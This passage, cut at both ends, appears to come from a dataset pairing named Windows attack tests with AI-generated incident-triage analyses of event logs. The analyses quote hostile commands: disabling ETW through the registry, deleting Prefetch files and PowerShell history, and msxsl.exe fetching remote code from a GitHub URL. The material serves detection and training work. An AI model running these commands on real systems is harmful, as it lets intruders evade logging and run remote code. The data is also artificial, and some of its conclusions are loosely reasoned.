### Summary:
The use of PowerShell to download and execute a script from an external source is a significant red flag. This type of action is commonly associated with malicious activity, especially when coupled with the invocation of a benign-looking `calc.exe`. This behavior matches known techniques used by malicious actors to obfuscate or launch more harmful payloads.

### Recommendation:
- **Resolution:** MALICIOUS
- **Actions to Take:**
  - Immediately conduct a deeper forensic analysis of ""Server002"" to determine the script's content from `https://raw.githubusercontent.com/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`.
  - Investigate network traffic to confirm any exfiltration or C2 communication originating from the host.
  - Quarantine the system to prevent any further potential malicious activity.
  - Follow up with a review of all systems in the network for indicators of compromise (IOCs) similar to those found in the current logs, especially any rogue PowerShell activities."
Disable .NET Event Tracing for Windows Via Registry (powershell),"After analyzing the provided Windows event logs, here are the observations and conclusions:

### Suspicious Activity Analyzed:

1. **PowerShell Log:**
   - There are multiple events where PowerShell is used to modify the registry with the command:
     ```
     powershell.exe & {New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \""DWord\"" -Force}
     ```
   - This command disables Event Tracing for Windows (ETW), which is often indicative of a potential attempt to evade detection. While this action can have legitimate uses, its occurrence should be questioned without a clear justification, especially since it alters system logging capabilities.

2. **System Log:**
   - There are events indicating time adjustments by `svchost.exe`. While time changes can occur normally (e.g., due to synchronization with a time server), it’s important to confirm that these adjustments happen as expected and are not indicative of tampering to disrupt timestamps forensics.

3. **Sysmon Log:**
   - A few process executions are logged:
     - Several instances of `wevtutil.exe` associated with the user `admin_test`. This utility is used to manage Windows event logs and its usage should be investigated to ensure it's not being used maliciously to clear logs.
     - Usage of `whoami.exe` and `hostname.exe` by the `admin_test` user — typically benign but unusual if in conjunction with other suspicious activity.
     - Execution of `powershell.exe` with the same command found in the PowerShell logs to modify registry entries disabling ETW. This strengthens concerns over potential evasion techniques being utilized.

4. **Security Log:**
   - There are events regarding very minimal time changes, which might be benign due to synchronization or other normal operations, but given the other logs, it might be worth investigating further.

5. **Application Log:**
   - Normal activity from the Software Protection Platform, seems system maintenance-related and not directly a security concern.

### Conclusion:

Considering the evidence gathered:
- The PowerShell command modifying ETW settings to disable logging is suspicious and suggests possible malicious activity, especially when coupled with the context of command-line script execution.
- The use of `wevtutil.exe` should be further investigated as it can indicate attempts to alter or clear event logs, which is a common tactic to cover tracks post-exploitation.
- Collectively, these patterns of behavior can suggest persistence mechanisms or attempts at anti-forensics.

### Resolution:

- **SUSPICIOUS**: The logs contain activity that is potentially malicious and warrants further investigation. Specifically, the disabling of ETW and frequent execution of `wevtutil.exe` should be scrutinized.

### Guidance:

1. **Immediate Actions:**
   - Review change management records to see if any administrative actions accounted for these changes.
   - Verify the context and authorization for the registry modification via PowerShell.
   - Check for additional signs of privilege escalation or lateral movement not captured in these logs.

2. **Further Investigation:**
   - Analyze related network traffic for connections that could be associated with malware command and control.
   - Review any changes made by `admin_test` or sessions that may correlate with these actions.
   - Ensure all endpoints have updated anti-malware scanning completed and monitored for further suspicious activity.

3. **Preventive Measures:**
   - Reinforce logging and monitoring strategies to detect and alert on similar registry changes and PowerShell activities in the future.
   - Ensure that sensitive administrative activities are audited and monitored regularly, including system time changes and log utility usage."
LOLBAS Msedge to Spawn Process,"Upon analyzing the provided Windows event logs, several observations can be made that point towards potential malicious activity:

1. **Execution of Windows PowerShell with Suspicious Commands:**
   - There are multiple events showing PowerShell execution with complex command lines involving the use of `msedge.exe` and `calc.exe`.
   - The script attempts to identify the installation path of Microsoft Edge and uses it to execute Edge while launching `C:\\Windows\\System32\\calc.exe` using the `--gpu-launcher` argument. This technique is atypical and aligns with known methods of misusing legitimate executables to mask malicious actions.

2. **Process Creation Events:**
   - There are numerous Sysmon logs indicating the creation of `calc.exe` in quick succession. This could be an indication of process injection or exploitation tactics where `calc.exe` is used as a placeholder for malicious processes to evade detection.
   - The use of PowerShell to launch processes and subsequently terminate them using the `taskkill` command suggests an attempt to execute a command silently and clean up afterward.

3. **Usage of Taskkill:**
   - The invocation of `taskkill.exe` to forcibly terminate instances of `msedge.exe`, `calc.exe`, and `win32calc.exe` indicates that commands are executed to open these applications, serve their intended (potentially malicious) purpose for a brief period, and then terminate them to minimize detection.

4. **Edge Update and Execution:**
   - The logs depict numerous executions of `MicrosoftEdgeUpdate.exe` and related executables. While Edge updates can be benign, when considered in conjunction with the PowerShell script and the nature of execution, it reflects potential misuse.

5. **No Proper Correlation or Context:**
   - While some services start and stop in the log entries, the sequence and correlation do not suggest typical system behavior for updates or regular software use.

6. **System and Security Logs Aligning with Timestamp Adjustments:**
   - Though the time change events themselves may be administrative, they coincide suspiciously with when multiple suspicious processes (like PowerShell) were initiated or when processes like `calc.exe` were trigger.

**Assessment:**
The series of events, particularly the PowerShell activities, suggest a suspicious pattern that needs more in-depth investigation. Given that PowerShell is utilized here with commands known to potentially exploit or utilize the system's applications illicitly, the assumption leans beyond mere misconfiguration towards a suspicious or potentially malicious activity.

**Resolution: SUSPICIOUS**
The activities within these logs warrant a classification of ""SUSPICIOUS"" due to the unusual use of PowerShell and Edge/Calc related processes, suggesting further investigation is needed. Immediate actions should include isolating the affected system, conducting a forensic investigation to confirm if a compromise occurred, and applying security measures to prevent potential exploitation vectors."
Modify UsePartialEncryptionKey Registry entry,"Upon reviewing the provided Windows event logs, there are several points of interest and indicators that warrant closer examination:

### Analysis:

1. **Process Execution of `wevtutil.exe`**:
   - The logs show multiple instances of `C:\Windows\System32\wevtutil.exe` being executed by the user `SERVER002\admin_test`. `wevtutil` is a legitimate Windows utility used to manage event logs. However, its execution can be suspicious, especially if unusual or if used excessively, as it may indicate an attempt to clear or export event logs to hide traces of malicious activity.

2. **Command Execution via `cmd.exe`**:
   - The entry for `C:\Windows\System32\cmd.exe` shows a command executed to modify the registry key `HKLM\SOFTWARE\Policies\Microsoft\FVE` using `reg.exe`. Such an action is suspicious as it suggests potential alterations to security policies or configurations, which are common in privilege escalation or persistence techniques.

3. **Time Synchronization Activity**:
   - Multiple entries from different logs indicate time adjustments (Event ID 4616 and the `NewTime`/`OldTime` entries) associated with `svchost.exe`. Although legitimate system processes can perform time sync operations (such as Windows Time Service), frequent, unusual adjustments could disrupt logging and timestamp accuracy or indicate an attempt to align event logs for malicious purposes.

4. **Usage of `whoami.exe` and `hostname.exe`**:
   - The presence of `whoami.exe` and `hostname.exe` commands being executed sequentially suggests information gathering. These are legitimate tools, but combined with other suspicious activities, they could be part of a discovery phase by a threat actor.

5. **Microsoft Edge Update Activities**:
   - There are numerous `MicrosoftEdgeUpdate.exe` entries suggesting routine update operations. Although this essentially could be benign, these activities should be verified against the update schedule. Any discrepancies could suggest misuse of legitimate software to perform malicious actions or misconfigured updates.

### Assessment:

Based on the analysis, there are signs of potentially suspicious behavior, particularly the registry changes and the frequent event log management attempts (`wevtutil.exe`). While not conclusively malicious, these actions warrant further investigation to determine the intent and full context of these activities. The combination of these events suggests a risk of potential compromise or misuse.

### Recommendation:

- **Resolution**: **SUSPICIOUS** - The activity observed is suspicious and requires further investigation.
  
### Guidance on Next Steps:

1. **Review User Activity**: Verify the account `SERVER002\admin_test` for any unauthorized or anomalous activities. Check for unexpected logons or privilege changes.
2. **Investigate Registry Changes**: Examine the registry changes made to FVE (Full Volume Encryption) policies for alignment with organizational policies.
3. **Correlate With Other Logs**: Cross-reference these log events with network activity logs, firewall logs, or security appliance logs to track any external connections, especially during the timeframe in question.
4. **Conduct Threat Hunt**: Probe the environment for additional indicators of compromise or lateral movement stemming from this host.
5. **Enforce Logging and Monitoring**: Ensure that logging is robust and that any future ""wevtutil"" usage is alerted or blocked in scenarios where it doesn’t fit normal activity patterns."
Requires the BitLocker PIN for Pre-boot authentication,"After thoroughly analyzing the provided Windows event logs, I have identified some activities that seem unusual and warrant a more in-depth examination. Here is a detailed breakdown of the analysis:

### Suspicious/Anomalous Behavior

1. **Multiple Execution of System Utilities**: 
   - The logs show repeated execution of `whoami.exe`, `hostname.exe`, `wevtutil.exe`, `cmd.exe`, `reg.exe` within a short timeframe. While some of these commands are not unusual on their own, their frequent and consecutive execution could indicate scripting or automation typically seen in malicious activity.
   - The use of `cmd.exe` with parameters to modify the Windows registry (`reg add`) is particularly concerning as it involves a change to Windows group policy potentially for persistence, privilege escalation, or tampering with security settings.

2. **Integrity Level**:
   - Many of the processes were run with ""High"" integrity level, which means they have elevated privileges. This combined with actions such as registry modifications increases risk.

3. **Anomalous Parent-Child Process Relationships**:
   - `conhost.exe` commonly acts as a child process for a command-line operation, but multiple instances are created for utilities like `whoami.exe`, `hostname.exe`, and `wevtutil.exe`. This appears overly excessive and atypical.

4. **Modification of Time Settings**:
   - The system time appears to have been changed. This may be an attempt to obfuscate logs or modify timestamps for evasion purposes.

5. **File Executions from Temp Directory and Edge Update**:
   - `MicrosoftEdgeUpdate.exe` is running from a temporary directory which is unusual behavior for a system file and could suggest a potential supply chain attack or update hijack.

### Threats or Risks Identified
- **Privilege Escalation and Persistence**: The use of `cmd.exe` to modify registry settings might be linked to a persistence mechanism or an attempt to escalate privileges.
- **Potential Stealth Activity**: Frequent use of native utilities and system programs can indicate an attempt to use ""living off the land"" tactics, where an attacker uses legitimate applications for malicious purposes.

### Guidance on How to Proceed
1. **Investigate Source and Intent**: 
   - Determine the origin of these commands and scripts to verify if they come from legitimate administrative activity or something unauthorized. 
   - Check the context of changes made to registry policies for unauthorized adjustments.

2. **Review Access Logs and Permissions**: 
   - Verify the identity and permissions of `SERVER002\\admin_test` and any changes that may have occurred recently. 
   - Confirm if the SYSTEM authority process interactions follow expected patterns.

3. **Enhanced Monitoring**:
   - Implement or verify alert configurations for execution of high-risk tools like `cmd.exe`, especially with parameters altering system configurations.
   - Increase logging verbosity temporarily to capture more detail on such activities for future incidents.

4. **Threat Hunting and Environment Hardening**:
   - Conduct a threat hunt for scripts or binaries potentially executing on other systems.
   - Review and tighten group policies, and audit registry changes for integrity.

### Conclusion

Given these observations, the resolution from the analysis is:
- **SUSPICIOUS**: While there's no definitive proof of outright malicious activity, several actions and patterns are abnormal and require further investigation to rule out or confirm malicious intent."
Disable Microsoft Defender Firewall via Registry,"Upon reviewing the provided Windows event logs, I have identified several key points in the logs that may indicate suspicious or potentially malicious activity, warranting further investigation.

### Detailed Analysis and Observations:

1. **Time Change Events:**
    - There are two `EventID 4616` entries in the Security logs showing time change events where the system time was altered. These changes are documented with very small differences in time, and are being executed by the process `svchost.exe` running as `LOCAL SERVICE`. 
    - Frequent or unexpected time changes can sometimes be indicative of attempts to manipulate timestamps to obscure activities, but could also result from legitimate NTP synchronization.

2. **Elevated Privileges:**
    - `EventID 4672` shows that the user `admin_test` was assigned special privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, and others allowing critical system actions. This could indicate a privilege escalation attempt or be a normal activity for an admin account performing legitimate tasks.

3. **Process and Command-Line Activities:**
    - **Sysmon EventID 1 and 5:** Several entries indicate process creation and file modification involving standard Windows utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, etc. However, a suspicious registry modification via `cmd.exe` is particularly alarming:
        - The command executed by `cmd.exe` suggests the Windows Firewall is being disabled (`/d 0`) with administrative privileges using `reg.exe`. This can be a suspicious activity indicating attempts to weaken system defenses.
    - **Hostname and Whoami Executions:** Frequent execution of `hostname.exe` and `whoami.exe` might indicate a script running queries about the environment or account being used, often associated with discovery tactics by an attacker.

4. **Network Logon:**
    - Multiple `EventID 4624` entries showing logon attempts, notably from `DESKTOP-3HL5B2P` using NTLM authentication and different IPs, including a local IP and an IPv6 address. This type of logon (type 3, network) is typically non-interactive and could be legitimate remote management but warrants attention due to the context.

5. **Edge Update Activities:**
    - Numerous events pertain to `MicrosoftEdgeUpdate.exe`, mostly appearing normal as the process for updating Microsoft Edge. While this seems routine, it contributes to noise making it easy to overlook more nefarious activities hidden within legitimate processes.

### Assessment:

Given the context of these logs and without more corroborating evidence, the activities identified here are deemed **SUSPICIOUS**. The manipulation of system time, disabling of the firewall, elevated privileges, and repeated host and user identification activities could collectively suggest attempts to obfuscate, discover, or even gain persistence on the system, without solid evidence of compromise. Further investigation should be conducted to confirm or dismiss these actions, which could include:
- Analyzing more logs over a wider time frame
- Checking file integrity and system modifications
- Conducting network analysis for suspicious connections
- Reviewing user activity and setting alerts for future anomalies

### Resolution:

Given the analysis above, the resolution is labeled as **SUSPICIOUS**, implying activity observed in the logs is not definitively malicious but merits further detailed investigation to ascertain its nature."
Delete a single file - Windows cmd,"Upon reviewing the provided Windows event logs, I have identified several elements that merit further discussion:

### Analysis:
1. **Sysmon Logs:**
   - **Command Execution**: There are repeated executions of `cmd.exe` running commands that check for or manipulate a file named `deleteme_data.004` in the `%temp%` directory. This could be part of a cleanup script or task.
   - **Command Line Arguments**:
     - Commands like `IF EXIST ""%temp%\\deleteme_data.004"" ( EXIT 0 ) ELSE ( EXIT 1 )` and `cmd.exe /c echo deleteme_data.004 >> %temp%\\deleteme_data.004` are executed multiple times. This pattern could be seen in benign scripting or automated tasks but could be suspicious if unexpected.
   - **Wevtutil and Conhost Usage**: The frequent appearance of `wevtutil.exe` and `conhost.exe` should be examined. `wevtutil.exe` is a legitimate utility for managing Windows Event Logs, but its unexpected use in conjunction with command processor (`cmd.exe`) operations related to event logs might indicate event log manipulation.

2. **Security Logs and System Logs:**
   - **Time Change Events**: There are two security events and corresponding system events indicating system time changes. Legitimate system operations can cause such events, but unauthorized time changes can be malicious, potentially used to alter log timestamps.
   - Both time change entries involve the process `svchost.exe`, which is a common process used by many Windows services. Without more context, these events are not immediately actionable but should be reviewed against expected behaviors for your environment.

3. **Application and System Logs:**
   - The `svchost.exe` process and a `sppsvc.exe` process (Software Protection Platform Service) are present without other accompanying indicators of deviation from expected behavior.
   - The events related to the `Microsoft-Windows-Security-SPP` appear routine.

### Assessment:
Considering the above points, there are elements that are not explicitly indicative of malware, but they raise some flags primarily due to the unusual but possibly benign repeated execution of certain commands. The time change events should be verified against legitimate activities.

### Resolution:
Based on the analysis, the events are categorized as:

- **SUSPICIOUS**: The command executions and time changes indicate potential activity that does not look standard and warrants further investigation, particularly to confirm if there's any unauthorized script or task execution aimed at file manipulation or log tampering.

### Recommendations:
- **Further Investigation**: Identify if any scheduled tasks or scripts are expected to perform these actions. If not, conduct a deeper investigation to understand the purpose of these commands.
- **Check for Known Scripts**: Compare the script or commands executed against the organization's repository of known and approved scripts.
- **Log Integrity**: Verify and ensure the integrity of system time and event logs to confirm there has been no unauthorized alteration.
- **Access Logs**: Cross-reference the execution times and user accounts against user access logs and behavior analytics to identify anomalies.
- **Capture System Context**: Perform a capture of the system state and rule out other signs of compromise before finalizing the nature of this activity."
Delete Prefetch File,"Upon analyzing the given logs, several notable points stand out:

### Windows PowerShell Log Analysis:
1. **PowerShell Execution:** The use of PowerShell with a command to remove items in the Prefetch folder using `powershell.exe & {Remove-Item -Path (Join-Path \\""$Env:SystemRoot\\prefetch\\"" (Get-ChildItem -Path \\""$Env:SystemRoot\\prefetch\\*.pf\\"" -Name)[0])}` is unusual. The Prefetch folder typically contains files used to speed up the boot process and application loading. Tampering with these files can be indicative of an attempt to cover tracks, remove evidence or reduce system performance monitoring, which is often associated with malicious activity.

### Sysmon Log Analysis:
2. **Process Creation:** The logs show the execution of common Windows utilities (e.g., `whoami.exe`, `hostname.exe`, `wevtutil.exe`) by the user `SERVER002\admin_test`. While these executables are benign on their own, it's worth noting that unnecessary and frequent use of administrative tools, such as `wevtutil.exe`, could be suspicious if not part of regular administrative tasks.
3. **Elevated Execution:** The processes were executed with high integrity level, indicating they were run with elevated privileges. This is normal for administrative tasks but combined with other indicators, it can hint at potential misuse.
4. **MicrosoftEdgeUpdate and SECURITY_PRODUCT_STATE_ON:** Various processes (like Microsoft Edge's updater) running as `NT AUTHORITY\SYSTEM` is quite normal as these services often run in the background for updates and maintenance tasks.

### Security Log Analysis:
5. **Logon Events:** Multiple logon events (Event ID 4624) with Logon Type 5 indicate service logons, which is normal for system services; however, using `Advapi` as the LogonProcessName suggests these logons are mostly system-triggered.
6. **Special Privilege Assignments:** Event ID 4672 with `SeDebugPrivilege` and other high privileges is expected for SYSTEM logons, allowing processes to debug programs and thus indicating high permissions.

### Suspicious Indicators and Anomalies:
- **Odd PowerShell Activity:** As previously noted, tampering with Prefetch files is suspicious.
- **Frequent Usage of `wevtutil.exe`:** Found being run multiple times could indicate log clearing activity, which is often used in unauthorized access attempts.
- **Repeated Failed Reads (Event ID 5379):** Multiple attempts to access credential-related operations that returned the same error code (3221226021) might signify failed attempts by a process to retrieve credential/sensitive information.

### Threat Assessment:
- The combination of PowerShell usage to tamper with prefetch files, unusual execution of wevtutil, and failed attempts to manage/deal with credentials point towards potentially suspicious activity that should be further investigated.

### Guidance and Resolution:
- **Recommendation:** Additional investigation required, specifically focusing on the purpose of the PowerShell script and whether the repetitive use of `wevtutil.exe` aligns with legitimate administration. Check for any signs of unauthorized access or manipulation of logs.
- **Resolution:** **SUSPICIOUS**
  
Given these points, while there isn't clear confirmation of malicious activity, the logs exhibit patterns typically associated with potential compromise and warrant further detailed investigation."
Clear Powershell History by Deleting History File,"Based on the review and analysis of the provided Windows event logs, the following points can be highlighted:

### System Log Analysis:
1. **Time Change Events**: Multiple instances of time change events carried out by `svchost.exe` under the service of `S-1-5-19` (LOCAL SERVICE). Time adjustments by the Windows time service are typical behavior, usually reflecting synchronization with an external time source. This does not seem indicative of malicious activity.

### Application Log Analysis:
1. **Software Protection Platform Service**: The involvement of the Software Protection Platform Service logging time-related information, typically associated with legitimate system operations, such as licensing compliance checks.

### Security Log Analysis:
1. **Time Change Event Logs**: Similar to the System logs, time change events appear reflecting adjustment of system time, corroborating the benign nature of the time sync cycle.

### Windows PowerShell Log Analysis:
1. **PowerShell Execution**: The PowerShell log reveals the execution of PowerShell with a command to remove the history file of PowerShell sessions, indicated by `powershell.exe & {Remove-Item (Get-PSReadlineOption).HistorySavePath}`. This could potentially indicate an attempt to clear the execution history, which might be considered suspicious if not part of regular maintenance or administrative tasking.

### Sysmon Log Analysis:
1. **Standard Operations**: Processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and PowerShell are executed, including their expected users and integrity levels. Notably, a PowerShell process is started by the user `SERVER002\\admin_test`, matching the suspicious PowerShell command seen in the corresponding logs.

2. **System Processes**: Processes like `TiWorker.exe`, `TrustedInstaller.exe`, and `sppsvc.exe` all executed by `NT AUTHORITY\SYSTEM` or `NETWORK SERVICE` are standard system Windows processes that appear normal with no deviation from usual activity, indicating no immediate threat.

### Conclusion:
- The PowerShell command used to remove command history is potentially suspicious, especially if the timing isn't coordinated with a scheduled, legitimate administrative task, as it could indicate an attempt to hide potentially malicious activity.
- No other events in the logs show clear signs of executing known malware or unauthorized privilege escalation.

### Final Resolution:
- **SUSPICIOUS**: Due to the PowerShell activity of clearing command history, which warrants further investigation to determine if it aligns with expected administrative duties and whether additional context is justified for benign actions or if further probing into potential tampering is needed.

### Guidance:
- Verify if there was an authorized maintenance task scheduled for this time period that could align with the PowerShell history clearing command. If no legitimate reason is found, further investigation into the user `admin_test` and their activities during this session is recommended.
- Review user and system policy for PowerShell usage and logging to ensure full visibility and adherence to security best practices.
"
WMIC bypass using local XSL file,"Based on the provided event logs, let's analyze the key points for suspicious or anomalous behavior:

### Security Log Analysis:
- **Event ID 4624 & 4672**: These indicate successful logons and the privilege assignment sessions. They show the SYSTEM user getting various high-level privileges such as `SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc. This matches typical system behavior, especially for services running under the SYSTEM account. However, frequent privilege assignments should be monitored but are not inherently malicious.

- **Event ID 5379**: These show credential read operations returning a status code `3221226021`, which translates to `STATUS_NO_SUCH_LOGON_SESSION`. This reflects failed attempts to associate credentials. While frequent failed credential accesses on privileged accounts should be investigated, they alone do not confirm malicious activity.

- **Event ID 4798**: Queries on various accounts (e.g., Administrator, Guest, etc.) conducted by the `taskhostw.exe` process. This can be normal for scheduled tasks or system processes, but out-of-place queries can indicate attempts to audit or manipulate user accounts.

### Sysmon Log Analysis:
- **Sysmon Event ID 1 & 5**: Events show multiple legitimate processes like `MicrosoftEdgeUpdate.exe`, `calc.exe`, `cmd.exe`, `svchost.exe`, `usbclient.exe`, etc., executed primarily under NT AUTHORITY\SYSTEM. Of particular interest, processes related to PowerShell, `wmic`, and command execution are often associated with potentially dangerous activity. Here, usage appears tied to legitimate administrative actions or updates.

- **PowerShell and WMI Usage**: The presence of `powershell.exe` and commands involving `wmic` indicates command-line execution, which, if not expected as part of routine administrative tasks, can be suspicious. However, there are no specific malicious command strings indicated in the logs.

### Application Log Analysis:
- **EdgeUpdate Events**: These simply indicate that a service related to Microsoft Edge update has stopped. This could be due to normal operations or updates.

### General Observations:
- There is evidence of administrative-level activity with SYSTEM rights, corresponding with high-level trusted operations.
- Frequent invocation of legitimate system processes does not, by itself, imply malicious intent, but an unexpected pattern of execution (like off-hours or excessive privilege requests) would warrant further investigation.
- Overall, there isn’t a specific indicator of a breach or malicious payload based on the logs above.

### Conclusion:

- **Resolution: SUSPICIOUS** - The logs do not provide definitive signs of malicious activity, but the extensive usage of elevated privileges, PowerShell, and WMI queries suggest activities that warrant closer scrutiny and further investigation to confirm their legitimacy. It would be prudent to verify against expected administrative activities and schedules, and examine any inconsistencies or confirmations of benign intent."
Invoke CHM with default Shortcut Command Execution,"Upon analyzing the provided logs, here are the findings:

1. **Windows PowerShell Logs:**
   - The logs indicate that PowerShell was executed with the following command:
     ```
     powershell.exe & {Invoke-ATHCompiledHelp -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm}
     ```
   - The use of PowerShell to invoke `Invoke-ATHCompiledHelp` is suspicious as this is an unusual function name and it's not a standard PowerShell cmdlet or script usually seen in legitimate operations. The command appears to be executing a CHM file (compiled HTML) which could potentially be used to execute malicious code.

2. **Sysmon Logs:**
   - The Sysmon log entries show multiple PowerShell instances being started, such as:
     ```
     C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
     ```
   - The process is being executed under the user `SERVER002\admin_test`, which implies administrative privileges. This adds to the suspicious nature of the command being run, as administrative level PowerShell use is a common tactic in attacks.
   - There are also multiple instances of `conhost.exe` and `wevtutil.exe`, which are legitimate Windows utilities but their simultaneous execution alongside PowerShell could be indicative of process chaining for malicious activities, such as evasion or persistence mechanisms.

3. **Application and System Logs:**
   - The only notable entry in the Application log is from the ""Software Protection Platform Service"", which doesn't raise immediate red flags as it pertains to licensing activities. No entries in the System log are provided, which limits insights from that angle.

**Assessment and Recommendation:**
- **SUSPICIOUS**: The usage of PowerShell to invoke the `Invoke-ATHCompiledHelp` suggests activity that is not typical of standard administrative or user operations. The potential misuse of a CHM file in combination with PowerShell is often associated with exploit or payload delivery mechanisms. The presence of `admin_test` running these operations further raises concerns about potential unauthorized administrative access or misuse.
  
- **Guidance**: This activity should be further investigated. Review recent changes or the presence of unauthorized files, especially any scripts or CHM files in the user’s directories. Check for unusual network connections or data exfiltration activities correlated with the timestamp of these events. Consider isolating the machine from the network and running antivirus/malware scans. Verify the integrity of security patches and ensure the system's PowerShell execution policy is set to a secure level, such as ""AllSigned"". Conduct a thorough investigation to ensure the machine has not been compromised."
MSXSL Bypass using remote files,"**Detailed Analysis of Windows Event Logs:**

Upon reviewing the provided log entries from the Application, Sysmon, Security, and System logs, several observations stand out. They primarily concern process executions and command-line activities:

1. **Application and System Updates:**
   - Regular entries linked to Microsoft Edge and associated update mechanisms, such as `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup.exe`, are witnessed throughout the logs. These activities are typically expected unless they are associated with unusual system behaviors.

2. **PowerShell and Command-Line Activity:**
   - The command `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` runs under the user `SERVER002\admin_test`. PowerShell execution by an administrative user is generally permissible but may merit further review if used in a non-standard manner.
   - A notable command exists: `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\msxsl.exe"" ""https://raw.githubusercontent.com/file/file-file/master/files/data/src/msxslxmlfile.xml""` indicates that PowerShell is invoking a script from the internet. This is particularly alarming, as it suggests an attempt to execute potentially malicious scripts from an external source.

3. **Command and Utility Calls:**
   - Execution of `hostname.exe` and `whoami.exe` is noted. While these commands provide system and user information and might be used routinely for administrative purposes, they could also form part of reconnaissance by an adversary when observed with unnecessary frequency or coupled with other suspicious activities.

4. **Suspicious CMD Activity:**
   - The specific invocation of `msxsl.exe` (an XML transformation tool) from a temporary directory with an external URL is atypical for routine operations. The nature of this execution suggests potential obfuscation or attempts to execute hidden payloads. 

5. **Time Manipulation:**
   - Entries such as Event ID 4616 (""The system time was changed"") indicate alterations to system time, which can sometimes signal illicit attempts to disrupt logs or exploit time-sensitive applications.

6. **User and Process Consistency:**
   - The majority of actions appear to be executed under `SERVER002\admin_test`, showing consistency in the commanding user. However, if this account isn't designated for scripting downloads or transformations, its activities should be scrutinized further.

**Assessment and Conclusion:**

While several logs can be attributed to legitimate update processes associated with Microsoft Edge, the execution of external scripts using PowerShell or CMD with internet-based resources (file download and execution) is not typical for standard operations. This particular activity raises red flags, as it may signify attempted exploitation or abuse of system resources, potentially indicating a compromise.

Given these insights, the activity described can be assessed as:

- **Resolution:** **MALICIOUS**

**Guidance and Next Steps:**

1. **Immediate Containment:** Investigate and, if necessary, disconnect the host from the network to prevent further potential malicious activity.
2. **Thorough Inspection:** Examine the `admin_test` user account for any unauthorized access or changes.
3. **Enhance Monitoring:** Utilize network and endpoint security tools to monitor similar behavior across other systems.
4. **Incident Response:** Engage the security team to conduct a comprehensive forensic investigation to clarify potential breach vectors and impacted systems.
5. **Remediation Plan:** Include strengthening of security policies, user permissions, and endpoint protection aligning with hardening guidelines."
Modify UseTPMPIN Registry entry,"Upon carefully analyzing the provided logs, here are the observations and findings:

### Observations:

1. **Sysmon Log Activities:**
   - **Frequent Execution of System Utilities:** There are multiple entries for the execution of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe`. These utilities are standard system tools used for various legitimate administrative and operational tasks.
   - **Registry Modification:** The `cmd.exe` process executed a command to modify the Windows registry (`reg add`) related to Windows BitLocker settings (`HKLM\SOFTWARE\Policies\Microsoft\FVE`). Registry modifications are often crucial indicators of system configuration changes or potential compromise.
   - **Integrity Level and Privilege Context:** The processes were executed under the `SERVER002\admin_test` account with `High` integrity level, suggesting the operations had elevated privileges.
   - **Process Parent Relationships:** The parent processes for these utilities are `wsmprovhost.exe` and others, indicating a potentially automated or scripted task executed by a system management utility.

2. **Security and System Log Activities:**
   - **Time Adjustment Events:** There are several entries indicating the system time was adjusted by the `svchost.exe` process. This behavior is expected for synchronization with external time servers such as `time.windows.com` but should be verified if typically performed at that frequency in the environment.
   - **Logon Context:** Activities logged under `NT AUTHORITY\SYSTEM` and `LOCAL SERVICE` accounts are typical for background service operations.

3. **Absence of PowerShell Logs:** There are no PowerShell event logs provided, which could suggest either non-use of PowerShell scripts or missing log data.

### Assessment:

- **Suspicious Activity:**
  - The registry modification using the command `reg add` that alters BitLocker settings could indicate potentially suspicious behavior, particularly in securing data at rest. Such changes might be benign if performed as part of an administrative policy but warrant further investigation to ensure they align with organizational IT policy.
  - The frequent execution of system utilities in a short timeframe suggests possibility of a scripted or automated process, which may need further evaluation regarding intended purpose and origin.

- **General Observations:**
  - No direct indicator explicitly confirming malicious intent was identified. However, the combination of registry changes, high-integrity execution, and potential time adjustments require validation against expected operational behavior and intention.

### Resolution:

**Resolution: SUSPICIOUS**

The activities logged show no direct malicious intent but raise enough concern due to:
- Registry modification indicating a potential security policy change.
- Execution context utilizing elevated privileges.
- Need for confirming the legitimacy and authorization of these actions, especially around data protection policies like BitLocker settings.

### Guidance and Recommendations:

- **Investigate and Validate:** Review the authorized changes or tasks scheduled during this period. Verify with the system administrator whether the registry changes align with current IT policy adjustments or if any task automation was initiated.
- **Review Change Management Logs:** Check for accompanying change requests or authorizations in your organization’s change management system.
- **Monitor and Audit Further Activities:** Increase monitoring on `admin_test` and other privileged user accounts for unusual patterns.
- **Policy Review:** Ensure system configuration and security policies are uptodate and communicated clearly to involved stakeholders.
- **Log Completeness:** Ensure all relevant logs, especially PowerShell, are being correctly collected and reviewed for a holistic view.

By following the above guidance, the organization can better determine the nature of these activities and mitigate any potential risks."
Create ADS command prompt,"### Detailed Analysis of Logs:

#### Unusual Activity Identification:
1. **Time Change Events:**
   - There are several events indicating time changes, specifically Event ID 1 from `Microsoft-Windows-Kernel-General` and Event ID 4616 from `Microsoft-Windows-Security-Auditing`. These events show that the time on the system was altered from a future timestamp back to the correct time.
   - Process involved: `svchost.exe`. This process normally runs many system services. Any alterations to system time by this process could be benign or an indicator of a time-spoofing attempt potentially aiming to evade detection or manipulate time-dependent operations.

2. **Privileged Logon Sessions:**
   - Event 4672 indicates a special privileges assignment to user `admin_test`, particularly powerful privileges like `SeDebugPrivilege` and `SeImpersonatePrivilege`. This can be normal for an administrative task but can also be indicative of preparation for lateral movement or privilege escalation in an attack context.

3. **Command Execution:**
   - From Sysmon logs, we observe `cmd.exe` executing with a command line that manipulates alternate data streams (Event ID 1). The command attempts to echo text to an ADS: `data.004_has_ads_cmd.txt:adstest.txt`. This can be a technique to embed hidden data into files without easily leaving traces.

4. **Unusual Process Execution:**
   - `MicrosoftEdgeUpdate.exe` and various console host processes (`conhost.exe`) are executed. The `EdgeUpdate.exe` process has legitimate Microsoft association, typically benign. However, execution of legitimate processes with unusual parameters or command lines can sometimes indicate abuse for malicious purposes.
   - Repeated launches of `wevtutil.exe` and `conhost.exe` in short succession, ostensibly benign, may also suggest attempts to manipulate or access event logs, potentially covering tracks.

5. **WMI Provider Host Execution:**
